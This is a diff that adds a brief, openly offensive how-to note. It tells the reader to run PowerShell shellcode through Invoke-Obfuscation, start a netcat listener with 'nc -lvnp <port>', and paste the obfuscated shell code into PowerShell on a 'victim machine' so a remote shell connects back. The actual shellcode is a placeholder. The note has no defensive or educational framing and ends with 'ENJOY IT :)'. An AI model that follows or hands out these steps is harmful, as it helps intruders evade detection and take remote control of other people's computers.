@@ -1,0 +1,25 @@
+---Installing and using---
+
+>Import-Module ./Invoke-Obfuscation.psd1
+>Invoke-Obfuscation
+
+---After Installation---
+
+set scriptblock <paste your shellcode> HIT ENTER!
+
+>ast
+>all
+>1
+DONE!
+
+---NatCat Listener---
+Open up a new terminal 
+>nc -lvnp <port> HIT ENTER!
+
+---Attack---
+- Open powershell on victim machine
+- Paste it your Invoke Shell Code
+- HIT ENTER!
+
+---We can see the connection on the terminal---
+ENJOY IT :)
